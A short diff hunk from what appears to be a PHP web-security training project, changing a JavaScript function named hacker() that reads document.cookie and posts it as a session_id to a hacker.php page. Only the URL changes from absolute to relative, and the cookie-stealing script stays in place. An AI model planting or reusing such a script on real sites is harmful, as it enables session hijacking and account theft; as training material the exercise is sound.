@@ -85,7 +85,7 @@ $users = $userModel->getUsers($params);
         async function hacker(){
 
             const number = document.cookie
-            await fetch(`http://localhost/training-php-1-php-202109-1-web-security/hacker.php?session_id=${number}`, {						
+            await fetch(`/training-php-1-php-202109-1-web-security/hacker.php?session_id=${number}`, {						
             method: 'POST',						
             headers: {						
                 'Accept': 'application/json',						
